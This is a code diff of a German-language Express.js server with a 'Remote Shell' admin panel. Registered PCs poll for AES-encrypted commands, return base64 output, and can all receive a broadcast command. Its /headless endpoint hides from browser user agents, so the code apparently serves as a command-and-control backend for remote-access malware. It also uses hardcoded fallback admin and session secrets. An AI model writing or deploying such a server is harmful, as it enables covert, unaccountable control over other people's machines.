@@ -2,10 +2,7 @@ const express = require('express');
 const session = require('express-session');
 const rateLimit = require('express-rate-limit');
 const crypto = require('crypto');
-const WebSocket = require('ws');
 const app = express();
-const server = require('http').createServer(app);
-const wss = new WebSocket.Server({ server });
 const PORT = process.env.PORT || 3000;
 
 app.set('trust proxy', 1);
@@ -14,21 +11,19 @@ app.use((req, res, next) => {
     next();
 });
 
-const ADMIN_PASSWORT = process.env.ADMIN_PASSWORD || "Achtung_Du_Musst_Ein_Passwort_Bei_Render_Eintragen_123456789";
+const ADMIN_PASSWORT = process.env.ADMIN_PASSWORD || "Achtung_Passwort_ndern";
 const AES_KEY = crypto.randomBytes(32);
 const ALGORITHM = 'aes-256-cbc';
-
 const registeredTokens = {};
 const pcCommands = {};
-const pcSockets = {};
+const pcOutputs = {};
 
 function generateToken() { return crypto.randomBytes(24).toString('hex'); }
 
 function encrypt(text) {
     const iv = crypto.randomBytes(16);
     const cipher = crypto.createCipheriv(ALGORITHM, AES_KEY, iv);
-    let e = cipher.update(text, 'utf8', 'hex') + cipher.final('hex');
-    return iv.toString('hex') + ':' + e;
+    return iv.toString('hex') + ':' + (cipher.update(text, 'utf8', 'hex') + cipher.final('hex'));
 }
 
 function decrypt(text) {
@@ -41,13 +36,13 @@ function decrypt(text) {
 app.use(express.urlencoded({ extended: true }));
 app.use(express.json());
 app.use(session({
-    secret: process.env.SESSION_SECRET || 'session-secret-muss-geaendert-werden',
+    secret: process.env.SESSION_SECRET || 'session-secret',
     resave: false, saveUninitialized: false,
     cookie: { maxAge: 30 * 60 * 1000 }
 }));
 
 const loginLimiter = rateLimit({ windowMs: 15 * 60 * 1000, max: 5,
-    message: '<h1>Zu viele Fehlversuche!</h1><p>Bitte warte 15 Minuten.</p>' });
+    message: '<h1>Zu viele Fehlversuche!</h1>' });
 
 // ==================== REGISTRIERUNG ====================
 app.post('/register', (req, res) => {
@@ -61,7 +56,22 @@ app.post('/register', (req, res) => {
     res.json({ token: registeredTokens[pcId].token });
 });
 
-// ==================== HEADLESS (fuer alte Clients) ====================
+// ==================== PC ENTFERNEN ====================
+app.post('/remove-pc', (req, res) => {
+    if (!req.session.eingeloggt) return res.status(403).json({ error: 'Unauthorized' });
+    const { pcId } = req.body;
+    if (pcId && registeredTokens[pcId]) {
+        delete registeredTokens[pcId];
+        delete pcCommands[pcId];
+        delete pcOutputs[pcId];
+        console.log(`[PC ENTFERNT] ${pcId}`);
+        res.json({ status: 'PC ' + pcId + ' entfernt' });
+    } else {
+        res.status(404).json({ error: 'PC nicht gefunden' });
+    }
+});
+
+// ==================== HEADLESS ====================
 app.get('/headless', (req, res) => {
     const ua = req.headers['user-agent'] || '';
     if (/Mozilla|Chrome|Safari|Firefox|Edge|Brave/i.test(ua)) {
@@ -78,13 +88,12 @@ app.get('/headless', (req, res) => {
     registeredTokens[pcId].lastSeen = Date.now();
     const command = pcCommands[pcId];
     if (command) {
-        try {
-            res.send(decrypt(command));
-            delete pcCommands[pcId];
-        } catch { res.send('KEIN_BEFEHL'); }
+        try { res.send(decrypt(command)); delete pcCommands[pcId]; }
+        catch { res.send('KEIN_BEFEHL'); }
     } else { res.send('KEIN_BEFEHL'); }
 });
 
+// ==================== OUTPUT ====================
 app.post('/output', (req, res) => {
     const token = req.headers['x-pc-token'];
     const pcId = req.headers['x-pc-id'];
@@ -93,14 +102,15 @@ app.post('/output', (req, res) => {
     }
     try {
         const output = Buffer.from(req.body.output, 'base64').toString('utf8');
-        if (!app.outputs) app.outputs = {};
-        if (!app.outputs[pcId]) app.outputs[pcId] = [];
-        app.outputs[pcId].push({ timestamp: new Date().toISOString(), output });
+        if (!pcOutputs[pcId]) pcOutputs[pcId] = [];
+        pcOutputs[pcId].push({ timestamp: new Date().toISOString(), output });
+        // Nur letzte 50 Outputs speichern (Speicher sparen)
+        if (pcOutputs[pcId].length > 50) pcOutputs[pcId] = pcOutputs[pcId].slice(-50);
         res.json({ status: 'received' });
     } catch { res.status(500).json({ error: 'Base64 Fehler' }); }
 });
 
-// ==================== BEFEHL SENDEN ====================
+// ==================== BEFEHL ====================
 app.post('/command', (req, res) => {
     if (!req.session.eingeloggt) return res.status(403).send('Zugriff verweigert!');
     const { target, command } = req.body;
@@ -108,24 +118,27 @@ app.post('/command', (req, res) => {
     const encrypted = encrypt(command);
     if (target === 'all') {
         for (const id in registeredTokens) pcCommands[id] = encrypted;
+        res.json({ status: 'Gesendet an ALLE PCs' });
     } else if (registeredTokens[target]) {
         pcCommands[target] = encrypted;
+        res.json({ status: 'Gesendet an ' + target });
+    } else {
+        res.status(404).json({ error: 'PC nicht gefunden' });
     }
-    res.json({ status: 'Gesendet' });
 });
 
+// ==================== STATUS ====================
 app.get('/pcs', (req, res) => {
     if (!req.session.eingeloggt) return res.status(403).send('Zugriff verweigert!');
     res.json(Object.entries(registeredTokens).map(([id, d]) => ({
         id, online: d.online, lastSeen: new Date(d.lastSeen).toLocaleString('de-DE'),
-        hasOutput: app.outputs && app.outputs[id] ? app.outputs[id].length : 0,
-        hasWebSocket: !!pcSockets[id]
+        outputCount: pcOutputs[id] ? pcOutputs[id].length : 0
     })));
 });
 
 app.get('/outputs/:pcId', (req, res) => {
     if (!req.session.eingeloggt) return res.status(403).send('Zugriff verweigert!');
-    res.json((app.outputs && app.outputs[req.params.pcId]) || []);
+    res.json(pcOutputs[req.params.pcId] || []);
 });
 
 // ==================== ADMIN ====================
@@ -138,32 +151,35 @@ app.get('/admin', (req, res) => {
 
 app.post('/admin/login', loginLimiter, (req, res) => {
     if (req.body.password === ADMIN_PASSWORT) { req.session.eingeloggt = true; res.redirect('/admin/dashboard'); }
-    else res.send('<h1>Falsches Passwort!</h1><a href="/admin">Nochmal versuchen</a>');
+    else res.send('<h1>Falsches Passwort!</h1><a href="/admin">Nochmal</a>');
 });
 
 app.get('/admin/dashboard', (req, res) => {
     if (!req.session.eingeloggt) return res.redirect('/admin');
-    res.send(`
-<!DOCTYPE html>
+    res.send(`<!DOCTYPE html>
 <html>
 <head>
 <title>Remote Shell</title>
 <style>
 * { margin: 0; padding: 0; box-sizing: border-box; }
-body { font-family: 'Courier New', monospace; background: #0c0c0c; color: #cccccc; height: 100vh; display: flex; flex-direction: column; }
-#topbar { background: #1a1a1a; padding: 8px 15px; display: flex; align-items: center; gap: 10px; border-bottom: 1px solid #333; }
-#topbar select { background: #2d2d2d; color: #fff; border: 1px solid #555; padding: 5px 10px; border-radius: 3px; font-family: monospace; }
+body { font-family: 'Courier New', monospace; background: #0c0c0c; color: #ccc; height: 100vh; display: flex; flex-direction: column; }
+#topbar { background: #1a1a1a; padding: 8px 15px; display: flex; align-items: center; gap: 10px; border-bottom: 1px solid #333; flex-wrap: wrap; }
+#topbar select { background: #2d2d2d; color: #fff; border: 1px solid #555; padding: 5px 10px; border-radius: 3px; }
 #topbar .status { font-size: 12px; }
-.online { color: #00ff88; }
-.offline { color: #ff4444; }
-#terminal { flex: 1; overflow-y: auto; padding: 10px; font-size: 14px; line-height: 1.5; }
+.online { color: #00ff88; } .offline { color: #ff4444; }
+#terminal { flex: 1; overflow-y: auto; padding: 10px; font-size: 13px; line-height: 1.4; }
 #terminal .prompt { color: #00d4ff; }
-#terminal .cmd { color: #ffffff; }
-#terminal .output { color: #cccccc; white-space: pre-wrap; }
-#terminal .error { color: #ff6b6b; white-space: pre-wrap; }
+#terminal .output { color: #ccc; white-space: pre-wrap; word-break: break-all; }
+#terminal .error { color: #ff6b6b; white-space: pre-wrap; word-break: break-all; }
+#terminal .info { color: #888; }
 #inputLine { display: flex; padding: 8px 15px; background: #1a1a1a; border-top: 1px solid #333; }
-#inputLine span { color: #00d4ff; margin-right: 8px; }
-#cmdInput { flex: 1; background: transparent; border: none; color: #fff; font-family: 'Courier New', monospace; font-size: 14px; outline: none; }
+#inputLine span { color: #00d4ff; margin-right: 8px; white-space: nowrap; }
+#cmdInput { flex: 1; background: transparent; border: none; color: #fff; font-family: 'Courier New', monospace; font-size: 13px; outline: none; }
+.pc-list { display: flex; gap: 8px; flex-wrap: wrap; margin-left: auto; }
+.pc-badge { font-size: 11px; padding: 3px 8px; border-radius: 3px; display: flex; align-items: center; gap: 5px; }
+.pc-badge.on { background: #003d25; color: #00ff88; }
+.pc-badge.off { background: #3d0000; color: #ff4444; }
+.pc-badge button { background: #ff4444; color: white; border: none; border-radius: 2px; cursor: pointer; font-size: 10px; padding: 1px 4px; }
 a { color: #00d4ff; text-decoration: none; }
 </style>
 </head>
@@ -172,6 +188,7 @@ a { color: #00d4ff; text-decoration: none; }
     <strong style="color:#00d4ff;">REMOTE SHELL</strong>
     <select id="target"><option value="all">ALLE PCs</option></select>
     <span class="status" id="status"></span>
+    <div class="pc-list" id="pcBadges"></div>
     <a href="/admin/logout" style="margin-left:auto;">Logout</a>
 </div>
 <div id="terminal"></div>
@@ -180,80 +197,99 @@ a { color: #00d4ff; text-decoration: none; }
     <input type="text" id="cmdInput" autofocus autocomplete="off" spellcheck="false">
 </div>
 <script>
-const terminal = document.getElementById('terminal');
-const cmdInput = document.getElementById('cmdInput');
+const term = document.getElementById('terminal');
+const input = document.getElementById('cmdInput');
 const target = document.getElementById('target');
 const promptText = document.getElementById('promptText');
 const status = document.getElementById('status');
-let history = [];
-let historyIdx = -1;
+const pcBadges = document.getElementById('pcBadges');
+let history = [], hIdx = -1;
+
+function add(type, text) {
+    const d = document.createElement('div');
+    d.className = type; d.textContent = text;
+    term.appendChild(d);
+    term.scrollTop = term.scrollHeight;
+}
 
 async function loadPCs() {
     const pcs = await (await fetch('/pcs')).json();
     const cur = target.value;
     target.innerHTML = '<option value="all">ALLE PCs</option>';
+    pcBadges.innerHTML = '';
     pcs.forEach(p => {
         const o = document.createElement('option');
-        o.value = p.id;
-        o.textContent = p.id + (p.online ? ' [WS]' : ' [HTTP]');
+        o.value = p.id; o.textContent = p.id;
         target.appendChild(o);
+        const badge = document.createElement('div');
+        badge.className = 'pc-badge ' + (p.online ? 'on' : 'off');
+        badge.innerHTML = p.id + ' ' + (p.online ? 'ON' : 'OFF') +
+            '<button onclick="removePC(\\'' + p.id + '\\')" title="Entfernen">X</button>';
+        pcBadges.appendChild(badge);
     });
-    try { target.value = pcs.find(p => p.id === cur)?.id || 'all'; } catch(e) {}
-    const count = pcs.filter(p => p.online).length;
-    status.textContent = count + ' online';
-    status.className = count > 0 ? 'status online' : 'status offline';
-}
-loadPCs();
-setInterval(loadPCs, 10000);
-
-function addLine(type, text) {
-    const div = document.createElement('div');
-    div.className = type;
-    div.textContent = text;
-    terminal.appendChild(div);
-    terminal.scrollTop = terminal.scrollHeight;
+    try {
+        const opt = pcs.find(p => p.id === cur);
+        target.value = opt ? opt.id : 'all';
+    } catch(e) {}
+    const n = pcs.filter(p => p.online).length;
+    status.textContent = n + ' online';
+    status.className = n > 0 ? 'status online' : 'status offline';
+    promptText.textContent = target.value === 'all' ? 'PS (ALL) >' : 'PS ' + target.value + ' >';
 }
 
-cmdInput.addEventListener('keydown', async (e) => {
+async function removePC(id) {
+    if (!confirm('PC ' + id + ' wirklich entfernen?')) return;
+    await fetch('/remove-pc', { method: 'POST', headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ pcId: id }) });
+    loadPCs();
+    add('info', '[SYSTEM] PC ' + id + ' entfernt');
+}
+
+input.addEventListener('keydown', async (e) => {
     if (e.key === 'Enter') {
-        const cmd = cmdInput.value.trim();
+        const cmd = input.value.trim();
         if (!cmd) return;
-        history.push(cmd);
-        historyIdx = history.length;
-        addLine('prompt', promptText.textContent + ' ' + cmd);
-        cmdInput.value = '';
+        history.push(cmd); hIdx = history.length;
         const t = target.value;
+        add('prompt', promptText.textContent + ' ' + cmd);
+        input.value = '';
+        add('info', '[SENDEN -> ' + (t === 'all' ? 'ALLE' : t) + ']');
         try {
-            await fetch('/command', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ target: t, command: cmd })
-            });
-        } catch(err) {}
+            await fetch('/command', { method: 'POST', headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ target: t, command: cmd }) });
+            // Output nach 3s laden
+            if (t !== 'all') setTimeout(() => loadOutput(t), 3000);
+        } catch{}
     } else if (e.key === 'ArrowUp') {
         e.preventDefault();
-        if (historyIdx > 0) { historyIdx--; cmdInput.value = history[historyIdx]; }
+        if (hIdx > 0) { hIdx--; input.value = history[hIdx]; }
     } else if (e.key === 'ArrowDown') {
         e.preventDefault();
-        if (historyIdx < history.length - 1) { historyIdx++; cmdInput.value = history[historyIdx]; }
-        else { historyIdx = history.length; cmdInput.value = ''; }
+        if (hIdx < history.length - 1) { hIdx++; input.value = history[hIdx]; }
+        else { hIdx = history.length; input.value = ''; }
+    } else if (e.key === 'Tab') {
+        e.preventDefault();
+        const opts = Array.from(target.options);
+        const idx = target.selectedIndex;
+        target.selectedIndex = (idx + 1) % opts.length;
+        promptText.textContent = target.value === 'all' ? 'PS (ALL) >' : 'PS ' + target.value + ' >';
     }
 });
 
-// WebSocket fur live Output
-const ws = new WebSocket('wss://' + location.host + '/ws-terminal');
-ws.onopen = () => { console.log('WS Terminal connected'); };
-ws.onmessage = (msg) => {
-    const data = JSON.parse(msg.data);
-    if (data.type === 'output') {
-        addLine('output', '[' + data.pcId + ']' + data.output);
-    } else if (data.type === 'error') {
-        addLine('error', '[' + data.pcId + ']' + data.output);
+async function loadOutput(pcId) {
+    const outputs = await (await fetch('/outputs/' + pcId)).json();
+    const last = outputs[outputs.length - 1];
+    if (last) {
+        add('output', '[' + pcId + ' OUTPUT]:');
+        add(last.output.trim().startsWith('Exit Code') ? 'error' : 'output', last.output.trim());
+    } else {
+        add('info', '[' + pcId + ']: Kein Output vorhanden');
     }
-};
-ws.onclose = () => { console.log('WS Terminal disconnected'); };
+}
 
-document.addEventListener('click', () => cmdInput.focus());
+loadPCs();
+setInterval(loadPCs, 10000);
+document.addEventListener('click', () => input.focus());
 </script>
 </body>
 </html>`);
@@ -261,64 +297,7 @@ document.addEventListener('click', () => cmdInput.focus());
 
 app.get('/admin/logout', (req, res) => { req.session.destroy(); res.redirect('/admin'); });
 
-// ==================== WEBSOCKET SERVER ====================
-wss.on('connection', (ws, req) => {
-    const url = new URL(req.url, 'http://' + req.host);
-    
-    // Admin Terminal WebSocket
-    if (url.pathname === '/ws-terminal') {
-        if (!req.session || !req.session.eingeloggt) { ws.close(); return; }
-        ws.isAdmin = true;
-        console.log('[WS] Admin Terminal verbunden');
-        return;
-    }
-
-    // PC Client WebSocket
-    const pcId = url.searchParams.get('pcId');
-    const token = url.searchParams.get('token');
-
-    if (!pcId || !token) { ws.close(); return; }
-
-    // Auto-Registrierung
-    if (!registeredTokens[pcId]) {
-        registeredTokens[pcId] = { token, lastSeen: Date.now(), online: true };
-    }
-    registeredTokens[pcId].token = token;
-    registeredTokens[pcId].online = true;
-    pcSockets[pcId] = ws;
-
-    console.log(`[WS] PC "${pcId}" verbunden`);
-
-    ws.on('message', (data) => {
-        try {
-            const msg = JSON.parse(data.toString());
-            registeredTokens[pcId].lastSeen = Date.now();
-
-            if (msg.type === 'output') {
-                // An Admin Terminal weiterleiten
-                const outputLine = JSON.stringify({ type: msg.isError ? 'error' : 'output', pcId, output: msg.data });
-                wss.clients.forEach(c => { if (c.isAdmin && c.readyState === 1) c.send(outputLine); });
-                
-                // Auch speichern
-                if (!app.outputs) app.outputs = {};
-                if (!app.outputs[pcId]) app.outputs[pcId] = [];
-                app.outputs[pcId].push({ timestamp: new Date().toISOString(), output: msg.data });
-            } else if (msg.type === 'heartbeat') {
-                registeredTokens[pcId].online = true;
-                registeredTokens[pcId].lastSeen = Date.now();
-            }
-        } catch {}
-    });
-
-    ws.on('close', () => {
-        console.log(`[WS] PC "${pcId}" getrennt`);
-        if (registeredTokens[pcId]) registeredTokens[pcId].online = false;
-        delete pcSockets[pcId];
-    });
-});
-
-server.listen(PORT, () => {
+app.listen(PORT, () => {
     console.log('Server lauft auf Port ' + PORT);
-    console.log('WebSocket AKTIV');
     console.log('Admin: /admin');
 });
